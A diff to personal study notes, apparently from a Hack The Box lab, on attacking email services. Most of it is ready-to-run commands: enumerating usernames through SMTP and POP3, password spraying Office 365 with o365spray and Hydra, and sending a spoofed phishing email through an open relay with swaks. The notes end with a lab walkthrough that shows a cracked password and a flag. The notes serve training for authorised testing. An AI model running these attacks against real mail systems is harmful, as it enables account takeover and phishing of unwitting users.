@@ -1255,6 +1255,7 @@ Email servers are complex and usually require us to enumerate multiple servers, 
 We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.
 
 We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:
+#### Host - MX Records
 
 ```shell
 host -t MX hackthebox.eu
@@ -1270,3 +1271,276 @@ Desglose:
 ```shell
 host -t MX microsoft.com
 ```
+#### DIG - MX Records
+
+```shell
+dig mx plaintext.do | grep "MX" | grep -v ";"
+```
+
+```shell
+dig mx inlanefreight.com | grep "MX" | grep -v ";"
+```
+
+If we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:
+
+|**Port**|**Service**|
+|---|---|
+|`TCP/25`|SMTP Unencrypted|
+|`TCP/143`|IMAP4 Unencrypted|
+|`TCP/110`|POP3 Unencrypted|
+|`TCP/465`|SMTP Encrypted|
+|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
+|`TCP/993`|IMAP4 Encrypted|
+|`TCP/995`|POP3 Encrypted|
+We can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system:
+
+```shell
+sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
+```
+## Misconfigurations
+
+Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.
+#### Authentication
+
+The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.
+
+`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.
+#### VRFY Command
+
+```shell
+telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+VRFY root
+252 2.0.0 root
+
+VRFY www-data
+252 2.0.0 www-data
+
+VRFY new-user
+550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
+```
+
+`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."
+#### EXPN Command
+
+```shell
+telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+EXPN john
+250 2.1.0 john@inlanefreight.htb
+
+EXPN support-team
+250 2.0.0 carol@inlanefreight.htb
+250 2.1.5 elisa@inlanefreight.htb
+```
+
+| `Acción` | `VRFY`                            | `EXPN`                                       |
+| -------- | --------------------------------- | -------------------------------------------- |
+| Qué hace | Verifica si **un usuario** existe | **Expande una lista** y muestra sus miembros |
+| Devuelve | Confirmación sí/no de uno         | **Todos los integrantes** de un alias        |
+| Valor    | Un usuario por consulta           | Varios usuarios + estructura organizativa    |
+`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
+#### RCPT TO Command
+
+```shell
+telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+MAIL FROM:test@htb.com
+250 2.1.0 test@htb.com... Sender ok
+
+RCPT TO:julio
+550 5.1.1 julio... User unknown
+
+RCPT TO:kate
+550 5.1.1 kate... User unknown
+
+RCPT TO:john
+250 2.1.5 john... Recipient ok
+```
+
+We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.
+#### USER Command
+
+```shell
+telnet 10.10.110.20 110
+
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
++OK POP3 Server ready
+
+USER julio
+-ERR
+
+USER john
++OK
+```
+
+To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.
+
+```shell
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+```
+## Cloud Enumeration
+
+As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.
+
+[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.
+#### O365 Spray
+
+```shell
+python3 o365spray.py --validate --domain msplaintext.xyz
+```
+
+Now, we can attempt to identify usernames.
+
+```shell
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+```
+## Password Attacks
+
+We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.
+#### Hydra - Password Attack
+
+```shell
+hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+```
+
+If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.
+#### O365 Spray - Password Spraying
+
+```shell
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+```
+## Protocol Specifics Attacks
+
+An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.
+#### Open Relay
+
+From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.
+
+```shell
+nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
+```
+
+Next, we can use any mail client to connect to the mail server and send our email.
+
+```shell
+swaks --from notifications@inlanefreight.com \
+      --to employees@inlanefreight.com \
+      --header 'Subject: Company Notification' \
+      --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' \
+      --server 10.10.11.213
+
+=== Trying 10.10.11.213:25...
+=== Connected to 10.10.11.213.
+<-  220 mail.localdomain SMTP Mailer ready
+ -> EHLO parrot
+<-  250-mail.localdomain
+<-  250-SIZE 33554432
+<-  250-8BITMIME
+<-  250-STARTTLS
+<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
+<-  250 HELP
+ -> MAIL FROM:<notifications@inlanefreight.com>
+<-  250 OK
+ -> RCPT TO:<employees@inlanefreight.com>
+<-  250 OK
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Thu, 29 Oct 2020 01:36:06 -0400
+ -> To: employees@inlanefreight.com
+ -> From: notifications@inlanefreight.com
+ -> Subject: Company Notification
+ -> Message-Id: <20201029013606.775675@parrot>
+ -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+ -> 
+ -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
+ -> 
+ -> 
+ -> .
+<-  250 OK
+ -> QUIT
+<-  221 Bye
+=== Connection closed with remote host.
+```
+## Exercise
+### What is the available username for the domain inlanefreight.htb in the SMTP server?
+
+First, add the IP to `/etc/hosts`
+
+and then
+
+```shell
+smtp-user-enum -t 10.129.203.12 -U users.list -M RCPT -D inlanefreight.htb
+```
+
+>[!Important]
+>I used the list given by HTB in order to spend less time to find the username. If want to use a seclists, it would last many minutes/hours `6807:marlin` 
+>
+
+```shell
+hydra -l marlin@inlanefreight.htb -P pws.list pop3://10.129.203.12
+```
+
+Once we have the user and pass, we can get in the mailbox of `marlin`
+
+```shell
+telnet 10.129.203.12 110                                                                                      ─╯
+Trying 10.129.203.12...
+Connected to 10.129.203.12.
+Escape character is '^]'.
++OK POP3
+user marlin@inlanefreight.htb
++OK Send your password
+pass poohbear
++OK Mailbox locked and ready
+HELP
++OK Normal POP3 commands allowed
+STAT
++OK 1 601
+LIST
++OK 1 messages (601 octets)
+1 601
+.
+RETR 1
++OK 601 octets
+Return-Path: marlin@inlanefreight.htb
+Received: from [10.10.14.33] (Unknown [10.10.14.33])
+	by WINSRV02 with ESMTPA
+	; Wed, 20 Apr 2022 14:49:32 -0500
+Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
+Subject: Password change
+From: marlin <marlin@inlanefreight.htb>
+To: administrator@inlanefreight.htb
+Cc: marlin@inlanefreight.htb
+Date: Wed, 20 Apr 2022 15:49:11 -0400
+Content-Type: text/plain; charset="UTF-8"
+User-Agent: Evolution 3.38.3-1 
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+Hi admin,
+
+How can I change my password to something more secure? 
+
+flag: HTB{w34k_p4$$w0rd}
+```
+
+
